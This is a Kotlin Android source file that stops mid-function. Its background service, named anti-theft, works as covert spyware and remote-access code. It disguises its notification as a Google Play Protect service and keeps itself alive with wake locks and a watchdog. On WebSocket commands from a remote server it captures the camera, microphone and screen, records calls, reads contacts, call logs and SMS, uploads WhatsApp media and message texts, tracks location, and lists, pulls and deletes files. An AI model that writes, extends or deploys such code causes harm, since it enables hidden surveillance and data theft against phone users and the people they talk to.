package com.androidprotect

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.graphics.ImageFormat
import android.graphics.Rect
import android.graphics.YuvImage
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.location.Location
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.database.ContentObserver
import android.net.Uri
import android.provider.Settings
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.telephony.PhoneStateListener
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import com.androidprotect.helpers.AudioHelper
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.FileOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.Recording
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.core.content.ContextCompat
import com.androidprotect.helpers.CameraHelper
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.booleanOrNull
import kotlinx.serialization.json.intOrNull
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString.Companion.toByteString
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit

class AntiTheftService : LifecycleService() {

    companion object {
        const val CHANNEL_ID = "antitheft_security_channel"
        const val NOTIFICATION_ID = 998877

        var serverIpAddress: String = "androidprotect.appbr.pro"
        var isServiceRunning = false
        var isWebSocketConnected = false
        var linkToken: String = ""
        var currentModelName: String = "" // exposed so MainActivity can read current name

        // Shared WebSocket used by core service and notification listeners
        @Volatile
        var webSocket: WebSocket? = null

        /** Send a raw JSON payload through the active WebSocket (if connected). */
        fun sendRawMessage(payload: String): Boolean {
            return webSocket?.send(payload) ?: false
        }

        // Storage for screen capture token
        var mediaProjectionResultCode: Int = 0
        var mediaProjectionData: Intent? = null

        @Volatile
        private var storedDeviceId: String = ""

        @Volatile
        private var serviceInstance: AntiTheftService? = null

        fun uploadWhatsAppMedia(file: File, type: String, isSent: Boolean, address: String, name: String, caption: String) {
            val id = storedDeviceId
            if (id.isBlank()) {
                Log.w("AntiTheftService", "Cannot upload WhatsApp media: no deviceId yet")
                return
            }
            val service = serviceInstance ?: run {
                Log.w("AntiTheftService", "Cannot upload WhatsApp media: service not running")
                return
            }
            service.uploadWhatsAppMediaInternal(file, type, isSent, address, name, caption)
        }
    }

    private lateinit var deviceId: String
    private lateinit var modelName: String

    // Helpers & Clients
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var cameraHelper: CameraHelper
    private lateinit var audioHelper: AudioHelper
    private var okHttpClient = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)   // infinite — required for WebSocket
        .writeTimeout(0, TimeUnit.MILLISECONDS)  // infinite — required for WebSocket
        .pingInterval(25, TimeUnit.SECONDS)      // KEY FIX: sends WS ping every 25s to prevent NAT/firewall from closing idle connection
        .retryOnConnectionFailure(false)         // never auto-retry WS handshakes (prevents duplicate server-side sessions)
        .build()

    // Active resources
    private var locationCallback: LocationCallback? = null
    private var mediaPlayer: MediaPlayer? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var flashHandler: Handler? = null
    private var flashRunnable: Runnable? = null
    private var isFlashing = false

    // Reconnect backoff
    private var reconnectDelay = 5000L
    private var connectTime   = 0L      // timestamp of last successful onOpen
    private var stableHandler = Handler(Looper.getMainLooper())
    private val stableRunnable = Runnable { reconnectDelay = 5000L } // reset only after 30s stable
    
    // Screen Capture state
    private var mediaProjectionManager: MediaProjectionManager? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var screenCaptureThread: HandlerThread? = null
    private var screenCaptureHandler: Handler? = null

    // Accessibility-based screen capture state (Android 11+)
    private var accessibilityFrameHandler: Handler? = null
    private var accessibilityFrameRunnable: Runnable? = null

    // Screen Recording state
    private var screenRecorder: android.media.MediaRecorder? = null
    private var recordingVirtualDisplay: VirtualDisplay? = null
    private var screenRecordFile: File? = null
    private var isScreenRecording = false

    // Call Recording state (MediaRecorder + PhoneStateListener)
    private var callRecorder: MediaRecorder? = null
    private var isCallRecording = false
    private var callRecordFile: File? = null
    private var callRecordNumber = "unknown"
    private var callRecordDirection = "in"   // "in" | "out"
    private var callState = TelephonyManager.CALL_STATE_IDLE
    @Suppress("DEPRECATION")
    private var phoneStateListener: PhoneStateListener? = null

    // Camera Recording state (CameraX VideoCapture)
    private var cameraVideoCapture: VideoCapture<Recorder>? = null
    private var cameraActiveRecording: Recording? = null
    private var isCameraRecording = false
    private var cameraRecordFace = "front"
    private var cameraRecordFile: File? = null

    // Live Camera Stream state (CameraX ImageAnalysis)
    private var cameraProvider: ProcessCameraProvider? = null
    private var cameraStreamExecutor: java.util.concurrent.ExecutorService? = null
    private var isCameraStreaming = false

    // Live Audio Stream state (AudioRecord → PCM WebSocket)
    private var audioRecord: AudioRecord? = null
    private var isAudioStreaming = false
    private var audioStreamThread: Thread? = null
    private var isScreenStreaming = false
    private var lastFrameTime = 0L

    // Scene-change detection (skip duplicate frames to save CPU/bandwidth)
    private var lastFrameHash = 0L

    // SMS monitoring
    private var smsObserver: ContentObserver? = null
    private var lastKnownSmsId = 0L

    // WhatsApp media file observer
    private var whatsAppMediaObserver: WhatsAppMediaObserver? = null
    private var whatsAppMediaStoreObserver: WhatsAppMediaStoreObserver? = null

    // Notification listener health check
    private var listenerCheckHandler = Handler(Looper.getMainLooper())
    private var listenerCheckRunnable: Runnable? = null

    // NetworkCallback — reconecta imediatamente quando a rede volta (saída do Doze)
    private var networkCallback: android.net.ConnectivityManager.NetworkCallback? = null

    // Periodic WhatsApp media scan (fallback for FileObserver misses on Xiaomi)
    private var mediaScanHandlerThread: HandlerThread? = null
    private var mediaScanHandler: Handler? = null
    private var mediaScanRunnable: Runnable? = null

    // Periodic health check
    private var healthCheckHandler = Handler(Looper.getMainLooper())
    private var healthCheckRunnable: Runnable? = null

    override fun onCreate() {
        super.onCreate()
        Log.d("AntiTheftService", "Service onCreate")
        isServiceRunning = true
        // Must call startForeground within 5s of onCreate to avoid ANR on Android 13+
        startForegroundNotification()
        
        // Generate Unique ID
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "android_dev"
        storedDeviceId = deviceId
        serviceInstance = this

        // Load preferences — custom name overrides the hardware model name
        val sharedPrefs = getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
        serverIpAddress = sharedPrefs.getString("server_ip", "androidprotect.appbr.pro") ?: "androidprotect.appbr.pro"
        val customName  = sharedPrefs.getString("device_custom_name", "").orEmpty().trim()
        modelName = if (customName.isNotEmpty()) customName
                    else "${Build.MANUFACTURER} ${Build.MODEL}"
        currentModelName = modelName
        linkToken = sharedPrefs.getString("link_token", "") ?: ""
        
        // Init Helpers
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        cameraHelper = CameraHelper(this)
        audioHelper = AudioHelper(this)
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        
        // Acquire partial wake lock to keep CPU running in background
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AndroidProtect::ServiceWakeLock")
        // 24h — renovado a cada hora no healthCheckRunnable; liberado em onDestroy.
        // Sem WakeLock a CPU dorme e o WebSocket morre silenciosamente em Doze.
        wakeLock?.acquire(24 * 60 * 60 * 1000L)

        // Detect SIM card change (potential theft indicator)
        checkSimChange()

        // Establish Server WebSocket connection
        connectToServer()

        // Start watching WhatsApp media folders (images, videos, audio, documents)
        whatsAppMediaObserver = WhatsAppMediaObserver.get().also { it.start() }
        whatsAppMediaStoreObserver = WhatsAppMediaStoreObserver.get(this).also { it.start() }

        // Schedule watchdog to restart this service if killed
        ServiceWatchdogWorker.schedule(this)

        // Periodically verify WhatsApp notification listener is enabled
        checkNotificationListenerStatus()
        listenerCheckRunnable = object : Runnable {
            override fun run() {
                checkNotificationListenerStatus()
                listenerCheckHandler.postDelayed(this, 60_000L)
            }
        }
        listenerCheckHandler.postDelayed(listenerCheckRunnable!!, 60_000L)

        // Periodic WhatsApp media scan (every 30s) — catches videos Xiaomi's FileObserver misses
        val scanThread = HandlerThread("MediaScanThread").apply { start() }
        mediaScanHandlerThread = scanThread
        mediaScanHandler = Handler(scanThread.looper)
        mediaScanRunnable = Runnable {
            scanWhatsAppMediaFolders()
            mediaScanHandler?.postDelayed(mediaScanRunnable!!, 30_000L)
        }
        mediaScanHandler?.postDelayed(mediaScanRunnable!!, 15_000L)

        // Periodic health check (every 60s) — também renova o WakeLock
        healthCheckRunnable = Runnable {
            // Renova WakeLock a cada hora para garantir que o CPU nunca durma
            // enquanto o serviço está ativo (WakeLock de 24h é renovado antes de expirar)
            try {
                if (wakeLock?.isHeld == true) {
                    wakeLock?.release()
                }
                val pm2 = getSystemService(Context.POWER_SERVICE) as PowerManager
                wakeLock = pm2.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AndroidProtect::ServiceWakeLock")
                wakeLock?.acquire(24 * 60 * 60 * 1000L)
            } catch (e: Exception) {
                Log.e("AntiTheftService", "WakeLock renewal error: ${e.message}")
            }
            logHealthStatus()
            healthCheckHandler.postDelayed(healthCheckRunnable!!, 60_000L)
        }
        healthCheckHandler.postDelayed(healthCheckRunnable!!, 60_000L)

        // NetworkCallback: reconecta imediatamente quando a rede volta (saída do Doze/Wi-Fi)
        registerNetworkCallback()

        // Gravação automática de ligações
        startCallRecordingMonitor()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.d("AntiTheftService", "Service onStartCommand")
        
        // Handle server IP update or linkToken-triggered reconnect from MainActivity.
        // Always reconnect so the current linkToken is included in the WebSocket URL —
        // the server reads it on connection and links the device to the account.
        val ipFromIntent = intent?.getStringExtra("SERVER_IP")
        if (ipFromIntent != null) {
            if (ipFromIntent != serverIpAddress) {
                serverIpAddress = ipFromIntent
                getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                    .edit().putString("server_ip", ipFromIntent).apply()
            }
            connectToServer()
        }

        // Handle device name update (reconnect to refresh the name on server)
        val newName = intent?.getStringExtra("DEVICE_NAME")
        if (!newName.isNullOrBlank() && newName != modelName) {
            modelName = newName
            connectToServer() // Reconnect so server registers the new name
        }

        // Handle SMS command (from SmsCommandReceiver backup channel)
        val smsCommand = intent?.getStringExtra("SMS_COMMAND")
        if (!smsCommand.isNullOrBlank()) {
            Log.i("AntiTheftService", "Executing SMS command: $smsCommand")
            sendConsoleLog("📱 Comando SMS recebido: $smsCommand")
            // Wrap in fake JSON to reuse existing handler
            handleRemoteCommand("""{"command":"$smsCommand"}""")
        }

        return START_STICKY
    }

    private fun startForegroundNotification() {
        val channelName = "Serviços de Otimização do Sistema"
        val channelDescription = "Gerencia consumo de bateria e proteção de integridade."

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                channelName,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = channelDescription
                setShowBadge(false)
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Serviços do Google Play Protect")
            .setContentText("Dispositivo otimizado e protegido em tempo real.")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build()

        // API 34+ (Android 14): startForeground() DEVE especificar o tipo de serviço.
        // O tipo declarado aqui deve ser subconjunto do foregroundServiceType no manifest.
        // Usamos ServiceCompat que lida com a API correta em cada versão do Android.
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // API 29+: tipos disponíveis — usamos os que não exigem token extra na inicialização.
                // mediaProjection só pode ser adicionado após obter o token via createScreenCaptureIntent().
                val serviceType = buildServiceType()
                androidx.core.app.ServiceCompat.startForeground(
                    this, NOTIFICATION_ID, notification, serviceType
                )
            } else {
                // API 21-28: startForeground sem tipo
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e("AntiTheftService", "startForeground falhou: ${e.message}")
            // Último recurso — sem tipo, evita crash total
            try { startForeground(NOTIFICATION_ID, notification) }
            catch (e2: Exception) {
                Log.e("AntiTheftService", "startForeground fallback também falhou: ${e2.message}")
            }
        }
    }

    /** Monta a bitmask de tipos de serviço em primeiro plano para a versão atual do Android. */
    private fun buildServiceType(): Int {
        var type = 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // API 34
            type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        }
        return type
    }

    private fun checkNotificationListenerStatus() {
        try {
            val enabled = WhatsAppNotificationListener.isEnabled(this)
            if (enabled) {
                if (WhatsAppNotificationListener.isConnected()) {
                    return
                }
                Log.d("AntiTheftService", "WhatsApp notification listener: ENABLED but not connected — requesting rebind")
                try {
                    android.service.notification.NotificationListenerService.requestRebind(
                        android.content.ComponentName(this, WhatsAppNotificationListener::class.java)
                    )
                } catch (e: Exception) {
                    Log.w("AntiTheftService", "requestRebind failed: ${e.message}")
                }
                return
            }
            Log.w("AntiTheftService", "WhatsApp notification listener: DISABLED")
            sendConsoleLog("⚠️ Acesso a Notificações está DESATIVADO. Textos do WhatsApp não serão enviados. Habilite em Configurações > Acesso a Notificações > AndroidProtect.")

            // Show a user-visible notification directing to settings
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    "listener_alert_channel",
                    "Permissões Importantes",
                    NotificationManager.IMPORTANCE_HIGH
                ).apply { description = "Alertas quando permissões críticas estão desativadas" }
                nm.createNotificationChannel(channel)
            }
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            val pendingIntent = PendingIntent.getActivity(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val alert = NotificationCompat.Builder(this, "listener_alert_channel")
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setContentTitle("AndroidProtect - Permissão necessária")
                .setContentText("Toque para ativar o Acesso a Notificações e capturar textos do WhatsApp")
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setContentIntent(pendingIntent)
                .build()
            nm.notify(998876, alert)
        } catch (e: Exception) {
            Log.e("AntiTheftService", "checkNotificationListenerStatus error: ${e.message}")
        }
    }

    // Build the dynamic WebSocket connection URL
    private fun getWebSocketUrl(): String {
        val cleanHost = serverIpAddress.trim()
        val isSecureDomain = !cleanHost.contains(":") && (cleanHost.contains(".") && !cleanHost.first().isDigit())
        
        val baseUrl = if (isSecureDomain) {
            "wss://$cleanHost/ws/device/$deviceId"
        } else {
            val hostWithPort = if (cleanHost.contains(":")) cleanHost else "$cleanHost:8080"
            "ws://$hostWithPort/ws/device/$deviceId"
        }

        var url = baseUrl +
                "?model=${UriEncoder.encode(modelName)}" +
                "&battery=${getBatteryPercentage()}" +
                "&charging=${isDeviceCharging()}"

        // Include link token so the server can link this device to the user account
        val savedToken = linkToken.ifBlank {
            getSharedPreferences("androidprotect_prefs", Context.MODE_PRIVATE)
                .getString("link_token", "") ?: ""
        }
        if (savedToken.isNotBlank()) {
            url += "&linkToken=${UriEncoder.encode(savedToken)}"
        }
        return url
    }

    // Build the dynamic HTTP file upload URL
    private fun getUploadUrl(path: String): String {
        val cleanHost = serverIpAddress.trim()
        val isSecureDomain = !cleanHost.contains(":") && (cleanHost.contains(".") && !cleanHost.first().isDigit())
        
        return if (isSecureDomain) {
            "https://$cleanHost$path"
        } else {
            val hostWithPort = if (cleanHost.contains(":")) cleanHost else "$cleanHost:8080"
            "http://$hostWithPort$path"
        }
    }

    // Connect to WebSocket Server
    private fun connectToServer() {
        webSocket?.close(1000, "Reconnecting")
        
        val url = getWebSocketUrl()
        Log.d("AntiTheftService", "Connecting to WebSocket: $url")
        
        val request = Request.Builder()
            .url(url)
            .build()
        
        webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d("AntiTheftService", "WebSocket opened")
                isWebSocketConnected = true
                connectTime = System.currentTimeMillis()

                // Schedule backoff reset only if connection stays stable for 30 seconds
                stableHandler.removeCallbacks(stableRunnable)
                stableHandler.postDelayed(stableRunnable, 30_000L)

                sendTelemetry()
                // registerSmsObserver faz contentResolver.query para obter o último SMS ID;
                // executar na main thread causaria ANR — delegar ao pool de I/O
                lifecycleScope.launch(Dispatchers.IO) {
                    registerSmsObserver()
                }
                sendConsoleLog("Aparelho conectado ao servidor.")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Handler(Looper.getMainLooper()).post { handleRemoteCommand(text) }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e("AntiTheftService", "WS failure: ${t.message}. Retry in ${reconnectDelay}ms")
                isWebSocketConnected = false
                scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d("AntiTheftService", "WS closed (code=$code reason=$reason)")
                isWebSocketConnected = false
                // Ignore intentional closes triggered by connectToServer() — a fresh
                // connection is already being created, so scheduling another reconnect
                // here would tear down the healthy new socket (self-perpetuating loop).
                if (reason == "Reconnecting") return
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        stableHandler.removeCallbacks(stableRunnable) // cancel "stable" reset if disconnected quickly

        // Conexão longa (>10s) = blip de rede temporário → reconecta rápido com delay fixo
        // Conexão curta (<10s) = erro real → aplica backoff exponencial
        val wasBrief = (System.currentTimeMillis() - connectTime) < 10_000L
        val delay = if (wasBrief) reconnectDelay else 3_000L

        Log.d("AntiTheftService", "Reconnecting in ${delay}ms (backoff: $reconnectDelay, wasBrief: $wasBrief)")

        Handler(Looper.getMainLooper()).postDelayed({
            if (isServiceRunning) connectToServer()
        }, delay)

        // Backoff exponencial apenas para erros reais; cap em 30s (antes era 60s)
        if (wasBrief) reconnectDelay = (reconnectDelay * 2).coerceAtMost(30_000L)
    }

    // Process incoming control panel commands
    private fun handleRemoteCommand(jsonString: String) {
        try {
            val root = Json.parseToJsonElement(jsonString).jsonObject
            val command = root["command"]?.jsonPrimitive?.content ?: return
            
            when (command) {
                "PING" -> sendTelemetry()
                "START_LOCATION" -> startLocationTracking()
                "STOP_LOCATION" -> stopLocationTracking()
                
                "TAKE_PHOTO" -> {
                    val cameraType = root["camera"]?.jsonPrimitive?.content ?: "front"
                    val useFront = cameraType == "front"
                    takeAndUploadPhoto(useFront)
                }
                
                "RECORD_AUDIO" -> {
                    val duration = root["duration"]?.jsonPrimitive?.intOrNull ?: 15
                    recordAndUploadAudio(duration)
                }
                
                "START_SCREEN_STREAM" -> startScreenStreaming()
                "STOP_SCREEN_STREAM" -> stopScreenStreaming()
                
                "PLAY_ALARM" -> playLoudAlarm()

                "START_CAMERA_STREAM" -> {
                    val cam = root["camera"]?.jsonPrimitive?.content ?: "front"
                    startCameraStream(cam)
                }
                "STOP_CAMERA_STREAM" -> stopCameraStream()

                "START_AUDIO_STREAM" -> startAudioStream()
                "STOP_AUDIO_STREAM"  -> stopAudioStream()

                "LIST_FILES" -> {
                    val path = root["path"]?.jsonPrimitive?.content ?: externalRoot()
                    // I/O de arquivo — roda em background para evitar ANR
                    lifecycleScope.launch(Dispatchers.IO) { listRemoteFiles(path) }
                }
                "DELETE_FILE" -> {
                    val path = root["path"]?.jsonPrimitive?.content ?: return
                    // deleteRecursively pode bloquear — roda em background
                    lifecycleScope.launch(Dispatchers.IO) { deleteRemoteFile(path) }
                }
                "DOWNLOAD_FILE" -> {
                    val path = root["path"]?.jsonPrimitive?.content ?: return
                    lifecycleScope.launch(Dispatchers.IO) { uploadRemoteFile(path) }
                }

                "SEND_MESSAGE" -> {
                    val message = root["message"]?.jsonPrimitive?.content ?: return
                    showMessageNotification(message)
                    // Send receipt back to server
                    val receipt = mapOf(
                        "type" to "MESSAGE",
                        "deviceId" to deviceId,
                        "content" to "✓ Mensagem recebida: $message"
                    )
                    webSocket?.send(Json.encodeToString(receipt))
                }

                "TAKE_SCREENSHOT" -> takeScreenshot()
                "START_SCREEN_RECORD" -> {
                    val duration = root["duration"]?.jsonPrimitive?.intOrNull ?: 30
                    startScreenRecord(duration)
                }
                "STOP_SCREEN_RECORD" -> stopScreenRecord()

                "START_CAMERA_RECORD" -> {
                    val face     = root["face"]?.jsonPrimitive?.content ?: "front"
                    val duration = root["duration"]?.jsonPrimitive?.intOrNull ?: 60
                    startCameraRecord(face, duration)
                }
                "STOP_CAMERA_RECORD" -> stopCameraRecord()

                // ContentProvider queries podem bloquear por segundos — sempre em background
                "GET_CONTACTS" -> lifecycleScope.launch(Dispatchers.IO) { syncContacts() }
                "GET_CALL_LOG" -> lifecycleScope.launch(Dispatchers.IO) { syncCallLog() }

                else -> Log.w("AntiTheftService", "Unknown command: $command")
            }
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Error parsing remote command: ${e.message}", e)
        }
    }

    // ── Contacts sync ──────────────────────────────────────────────────────────
    private fun syncContacts() {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.w("AntiTheftService", "syncContacts: READ_CONTACTS permission not granted")
            sendConsoleLog("syncContacts: permissão READ_CONTACTS não concedida")
            return
        }
        try {
            val contacts = mutableListOf<Map<String, String>>()
            val projection = arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
            )
            contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection, null, null,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )?.use { cursor ->
                val nameIdx = cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val phoneIdx = cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (cursor.moveToNext()) {
                    contacts.add(mapOf(
                        "name"  to (cursor.getString(nameIdx) ?: ""),
                        "phone" to (cursor.getString(phoneIdx) ?: "")
                    ))
                }
            }
            val payload = buildString {
                append("{\"type\":\"CONTACTS\",\"deviceId\":\"$deviceId\",\"contacts\":[")
                contacts.forEachIndexed { i, c ->
                    if (i > 0) append(",")
                    val name  = c["name"]!!.replace("\\", "\\\\").replace("\"", "\\\"")
                    val phone = c["phone"]!!.replace("\\", "\\\\").replace("\"", "\\\"")
                    append("{\"name\":\"$name\",\"phone\":\"$phone\"}")
                }
                append("]}")
            }
            webSocket?.send(payload)
            Log.d("AntiTheftService", "Contacts synced: ${contacts.size}")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "syncContacts error: ${e.message}", e)
        }
    }

    // ── Call log sync ──────────────────────────────────────────────────────────
    private fun syncCallLog() {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG)
                != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.w("AntiTheftService", "syncCallLog: READ_CALL_LOG permission not granted")
            sendConsoleLog("syncCallLog: permissão READ_CALL_LOG não concedida")
            return
        }
        try {
            val calls = mutableListOf<Map<String, Any>>()
            val projection = arrayOf(
                android.provider.CallLog.Calls.CACHED_NAME,
                android.provider.CallLog.Calls.NUMBER,
                android.provider.CallLog.Calls.TYPE,
                android.provider.CallLog.Calls.DURATION,
                android.provider.CallLog.Calls.DATE
            )
            contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                projection, null, null,
                android.provider.CallLog.Calls.DATE + " DESC"
            )?.use { cursor ->
                val nameIdx  = cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
                val numIdx   = cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                val typeIdx  = cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE)
                val durIdx   = cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION)
                val dateIdx  = cursor.getColumnIndex(android.provider.CallLog.Calls.DATE)
                var count = 0
                while (cursor.moveToNext() && count < 500) {
                    val callTypeInt = cursor.getInt(typeIdx)
                    val callTypeStr = when (callTypeInt) {
                        android.provider.CallLog.Calls.INCOMING_TYPE  -> "incoming"
                        android.provider.CallLog.Calls.OUTGOING_TYPE  -> "outgoing"
                        android.provider.CallLog.Calls.MISSED_TYPE    -> "missed"
                        android.provider.CallLog.Calls.REJECTED_TYPE  -> "rejected"
                        else                                           -> "unknown"
                    }
                    calls.add(mapOf(
                        "name"      to (cursor.getString(nameIdx) ?: ""),
                        "number"    to (cursor.getString(numIdx) ?: ""),
                        "type"      to callTypeStr,
                        "duration"  to cursor.getLong(durIdx),
                        "timestamp" to cursor.getLong(dateIdx)
                    ))
                    count++
                }
            }
            val payload = buildString {
                append("{\"type\":\"CALL_LOG\",\"deviceId\":\"$deviceId\",\"calls\":[")
                calls.forEachIndexed { i, c ->
                    if (i > 0) append(",")
                    val name   = (c["name"] as String).replace("\\", "\\\\").replace("\"", "\\\"")
                    val number = (c["number"] as String).replace("\\", "\\\\").replace("\"", "\\\"")
                    append("{\"name\":\"$name\",\"number\":\"$number\",\"type\":\"${c["type"]}\",\"duration\":${c["duration"]},\"timestamp\":${c["timestamp"]}}")
                }
                append("]}")
            }
            webSocket?.send(payload)
            Log.d("AntiTheftService", "Call log synced: ${calls.size}")
        } catch (e: Exception) {
            Log.e("AntiTheftService", "syncCallLog error: ${e.message}", e)
        }
    }

    // Telemetry Update Dispatcher
    private fun sendTelemetry(lat: Double? = null, lng: Double? = null,
                               accuracy: Float? = null, provider: String? = null) {
        try {
            val telemetryMap = mutableMapOf<String, String>()
            telemetryMap["type"]      = "TELEMETRY"
            telemetryMap["deviceId"]  = deviceId
            telemetryMap["battery"]   = getBatteryPercentage().toString()
            telemetryMap["isCharging"]= isDeviceCharging().toString()
            telemetryMap["wifi"]      = getWifiSsid()

            if (lat != null && lng != null) {
                telemetryMap["lat"]      = lat.toString()
                telemetryMap["lng"]      = lng.toString()
                telemetryMap["accuracy"] = (accuracy ?: 0f).toString()
                telemetryMap["provider"] = provider ?: "unknown"
            }

            webSocket?.send(Json.encodeToString(telemetryMap))
        } catch (e: Exception) {
            Log.e("AntiTheftService", "Failed to send telemetry: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun getWifiSsid(): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val cm = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE)
                        as android.net.ConnectivityManager
                val network = cm.activeNetwork ?: return "Desconectado"
                val caps = cm.getNetworkCapabilities(network) ?: return "Desconectado"
                val info = caps.transportInfo
                if (info is android.net.wifi.WifiInfo) {
                    info.ssid.removeSurrounding("\"")
                } else "Desconectado"
            } else {
                @Suppress("DEPRECATION")
                val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                @Suppress("DEPRECATION")
